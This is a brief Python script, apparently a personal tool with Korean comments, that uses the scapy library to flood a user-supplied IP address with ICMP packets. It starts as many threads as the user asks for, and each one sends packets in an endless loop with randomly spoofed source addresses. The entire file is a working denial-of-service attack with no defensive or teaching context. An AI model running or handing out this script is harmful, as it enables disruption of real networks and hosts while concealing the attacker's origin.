from scapy.all import *
from threading import Thread
import string

class icmp_flood(Thread):
    def __init__(self, dst_IP):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.running = True
        self.intercount = 0
        
        #ascii의 모든 문자와 숫자를 가져온 뒤 합친 문자열*600
        self.data = (string.ascii_letters + string.digits)
        self.res = str(self.data.encode('utf8'))
        
    def run(self):
        while self.running:
            #src = RandIP로 출발지 IP를 랜덤하게 설정.
            #dst = 입력한 목적지 IP. 
            self.icmpf = IP(src = RandIP(), dst = self.dst_IP, ttl = 20)/ICMP()/(self.data)
            
            send(self.icmpf)
            print('Packet Sent : ' + str(self.intercount))
            self.intercount+=1

def main():
    dst_IP = input('Destination IP : ')
    run_thread = int(input('Run Thread (number) : '))
    rthread = []
    
    for SF in range(run_thread):
        SF = icmp_flood(dst_IP)
        rthread.append(SF)
        SF.start()
        
if __name__=='__main__':
    main()